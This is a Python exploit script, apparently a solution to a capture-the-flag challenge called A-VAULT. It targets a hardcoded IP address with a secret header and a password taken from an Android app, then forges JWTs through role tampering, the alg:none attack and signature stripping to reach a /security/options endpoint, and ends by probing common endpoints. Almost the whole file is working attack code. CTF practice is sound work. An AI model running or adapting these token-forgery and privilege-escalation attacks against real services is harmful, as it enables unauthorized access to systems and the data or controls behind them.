#!/usr/bin/env python3
"""
Exploit for A-VAULT CTF challenge.

From reverse engineering the Android app:
- Required header: A-VALUT: x-monitor-client-921754
- Hardcoded password: R4M_$tonks
- Endpoints: /anon, /login, /feed, /security/options
- JWT auth via Bearer token
"""

import requests
import json
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://34.185.153.233:31320"

HEADERS = {
    "Content-Type": "application/json",
    "A-VALUT": "x-monitor-client-921754",
}

s = requests.Session()
s.verify = False
s.headers.update(HEADERS)

# Step 1: Hit /anon endpoint (GET, no auth)
print("[*] Step 1: Hitting /anon endpoint...")
try:
    r = s.get(f"{BASE_URL}/anon")
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text}")
except Exception as e:
    print(f"    Error: {e}")

# Also try POST to /anon
print("\n[*] Step 1b: POST /anon...")
try:
    r = s.post(f"{BASE_URL}/anon")
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text}")
except Exception as e:
    print(f"    Error: {e}")

# Step 2: Login with hardcoded password
print("\n[*] Step 2: Logging in with hardcoded password...")
login_data = {"password": "R4M_$tonks"}
try:
    r = s.post(f"{BASE_URL}/login", json=login_data)
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text}")
    
    # Try to extract JWT from response
    try:
        resp_json = r.json()
        print(f"    JSON: {json.dumps(resp_json, indent=2)}")
        token = resp_json.get("token") or resp_json.get("jwt") or resp_json.get("access_token") or resp_json.get("jwt_token")
        if token:
            print(f"\n[+] Got JWT token: {token}")
        else:
            # Maybe the whole response is the token or it's in a different field
            for key, val in resp_json.items():
                if isinstance(val, str) and len(val) > 20 and '.' in val:
                    token = val
                    print(f"\n[+] Possible JWT in field '{key}': {token}")
                    break
    except:
        # Maybe the response itself is the token
        if '.' in r.text and len(r.text) > 20:
            token = r.text.strip()
            print(f"\n[+] Response might be JWT: {token}")
        else:
            token = None
except Exception as e:
    print(f"    Error: {e}")
    token = None

# Step 3: Decode JWT to understand its structure
if token:
    print("\n[*] Step 3: Decoding JWT...")
    parts = token.split('.')
    for i, part in enumerate(parts[:2]):  # header and payload
        # Add padding
        padded = part + '=' * (4 - len(part) % 4)
        try:
            decoded = base64.urlsafe_b64decode(padded)
            label = "Header" if i == 0 else "Payload"
            print(f"    {label}: {decoded.decode()}")
        except Exception as e:
            print(f"    Part {i}: Failed to decode: {e}")

# Step 4: Try /feed with token
if token:
    print("\n[*] Step 4: Hitting /feed with token...")
    auth_headers = {"Authorization": f"Bearer {token}"}
    try:
        r = s.post(f"{BASE_URL}/feed", headers=auth_headers)
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

    # Also try GET
    try:
        r = s.get(f"{BASE_URL}/feed", headers=auth_headers)
        print(f"    GET Status: {r.status_code}")
        print(f"    GET Response: {r.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

# Step 5: Try /security/options with "open"
if token:
    print("\n[*] Step 5: Trying /security/options with door=open...")
    auth_headers = {"Authorization": f"Bearer {token}"}
    door_data = {"door": "open"}
    try:
        r = s.post(f"{BASE_URL}/security/options", json=door_data, headers=auth_headers)
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text}")
    except Exception as e:
        print(f"    Error: {e}")

# Step 6: Try JWT manipulation - if we have a token, try to change role to admin
if token:
    print("\n[*] Step 6: Trying JWT manipulation...")
    parts = token.split('.')
    if len(parts) == 3:
        # Decode payload
        padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
        try:
            payload = json.loads(base64.urlsafe_b64decode(padded))
            print(f"    Original payload: {payload}")
            
            # Try various role escalation approaches
            # Approach 1: Change role to admin
            for role_field in ['role', 'admin', 'is_admin', 'privilege', 'level', 'type', 'user_type']:
                if role_field in payload:
                    print(f"    Found field '{role_field}': {payload[role_field]}")
            
            # Try alg:none attack
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            print(f"    JWT Header: {header}")
            
            # Create modified tokens with different roles
            modified_payloads = []
            
            # Try setting role to admin
            for admin_val in ["admin", "administrator", "root", "security", "owner"]:
                mod = payload.copy()
                mod["role"] = admin_val
                modified_payloads.append(("role=" + admin_val, mod))
            
            # Try setting is_admin
            mod = payload.copy()
            mod["is_admin"] = True
            modified_payloads.append(("is_admin=true", mod))
            
            # Try alg:none attack
            none_header = {"alg": "none", "typ": "JWT"}
            none_header_b64 = base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode()
            
            for desc, mod_payload in modified_payloads:
                mod_payload_b64 = base64.urlsafe_b64encode(json.dumps(mod_payload).encode()).rstrip(b'=').decode()
                
                # alg:none attack (no signature)
                forged_token = f"{none_header_b64}.{mod_payload_b64}."
                
                print(f"\n    Trying {desc} with alg:none...")
                auth_headers = {"Authorization": f"Bearer {forged_token}"}
                try:
                    r = s.post(f"{BASE_URL}/security/options", json={"door": "open"}, headers=auth_headers)
                    print(f"      Status: {r.status_code}")
                    print(f"      Response: {r.text[:300]}")
                except Exception as e:
                    print(f"      Error: {e}")
                
                # Try with original header + empty signature
                forged_token2 = f"{parts[0]}.{mod_payload_b64}."
                print(f"    Trying {desc} with empty signature...")
                auth_headers = {"Authorization": f"Bearer {forged_token2}"}
                try:
                    r = s.post(f"{BASE_URL}/security/options", json={"door": "open"}, headers=auth_headers)
                    print(f"      Status: {r.status_code}")
                    print(f"      Response: {r.text[:300]}")
                except Exception as e:
                    print(f"      Error: {e}")
                    
                # Try with original signature
                forged_token3 = f"{parts[0]}.{mod_payload_b64}.{parts[2]}"
                print(f"    Trying {desc} with original signature...")
                auth_headers = {"Authorization": f"Bearer {forged_token3}"}
                try:
                    r = s.post(f"{BASE_URL}/security/options", json={"door": "open"}, headers=auth_headers)
                    print(f"      Status: {r.status_code}")
                    print(f"      Response: {r.text[:300]}")
                except Exception as e:
                    print(f"      Error: {e}")
        except Exception as e:
            print(f"    Error decoding JWT: {e}")

# Step 7: Try other endpoints
print("\n[*] Step 7: Probing other common endpoints...")
for endpoint in ["/", "/api", "/admin", "/flag", "/vault", "/open", "/register", "/signup", "/status", "/health", "/info"]:
    try:
        r = s.get(f"{BASE_URL}{endpoint}", headers={"Authorization": f"Bearer {token}"} if token else {})
        if r.status_code != 404:
            print(f"    GET {endpoint}: {r.status_code} - {r.text[:200]}")
    except Exception as e:
        pass
    try:
        r = s.post(f"{BASE_URL}{endpoint}", headers={"Authorization": f"Bearer {token}"} if token else {})
        if r.status_code != 404:
            print(f"    POST {endpoint}: {r.status_code} - {r.text[:200]}")
    except Exception as e:
        pass
